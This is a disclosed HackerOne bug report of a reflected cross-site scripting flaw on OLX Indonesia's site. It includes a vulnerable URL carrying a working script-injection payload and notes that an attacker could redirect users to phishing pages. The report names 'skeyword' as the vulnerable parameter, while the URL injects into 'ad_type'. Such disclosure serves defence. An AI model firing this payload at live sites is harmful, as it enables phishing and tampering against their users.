@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/633751
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/ameytakekar
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:03.11.2019 18:33:06
+
+Summary:
+
+I have identified a Reflected Cross Site Scripting (XSS) vulnerability on the www.olx.co.id website.
+
+Vulnerable URL: https://www.olx.co.id/iklan/sony-xz-ram-3gb-32gb-finger-mulus-preisure-naik-test-air-disini-IDA2UED.html?ad_type=OR"/><script>alert("XSS")</script>
+
+Vulnerable Parameter: skeyword
+
+XSS Payload: OR"/><script>alert("XSS")</script>
+
+Steps to replicate is fairly simple. Just access the URL and the JavaScript gets reflected in response and gets executed on the browser. The Popup screenshot attached.
+
+Let me know if any further help is required from my side.
+
+## Impact
+
+An attacker can inject any arbitrary JavaScripts which can:
+1. Redirect user to malicious website like phishing website etc.
+2. Rewrite the content of the current HTML page whcuh can result in Brand Abuse.
